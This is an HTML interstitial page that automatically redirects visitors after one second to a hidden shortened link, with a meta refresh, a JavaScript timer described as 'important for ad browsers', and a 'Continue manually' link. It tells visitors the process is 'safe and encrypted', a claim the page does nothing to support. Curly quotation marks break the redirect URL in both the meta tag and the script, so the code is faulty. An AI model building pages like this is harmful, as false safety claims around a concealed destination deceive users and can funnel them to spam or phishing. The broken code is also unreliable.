<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connecting...</title>
  <!-- 1 second redirect -->
  <meta http-equiv="refresh" content="1; url=“https://ln.run/IkQ4X">
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      background: #f3f4f6;
      color: #111827;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 420px;
      padding: 20px;
    }
    .card {
      background: #ffffff;
      border-radius: 12px;
      padding: 28px;
      text-align: center;
      box-shadow: 0 6px 20px rgba(0,0,0,0.05);
    }
    .spinner {
      width: 28px;
      height: 28px;
      border: 3px solid #e5e7eb;
      border-top: 3px solid #2563eb;
      border-radius: 50%;
      margin: 20px auto;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }
    .title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 6px;
    }
    .text {
      font-size: 14px;
      color: #6b7280;
    }
    .small {
      font-size: 12px;
      color: #9ca3af;
      margin-top: 12px;
    }
    a {
      display: inline-block;
      margin-top: 14px;
      font-size: 13px;
      color: #2563eb;
      text-decoration: none;
    }
  </style>
  <script>
    // Backup redirect (important for ad browsers)
    setTimeout(function() {
      window.location.href = “https://ln.run/IkQ4X";
    }, 1000);
  </script>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="title">Connecting you securely...</div>
      <div class="spinner"></div>
      <div class="text">
        Please wait while we redirect you to the requested page.
      </div>
      <div class="small">
        This process is safe and encrypted.
      </div>
      <!-- fallback -->
      <a href="https://ln.run/IkQ4X">
        Continue manually
      </a>
    </div>
  </div>
</body>
</html>
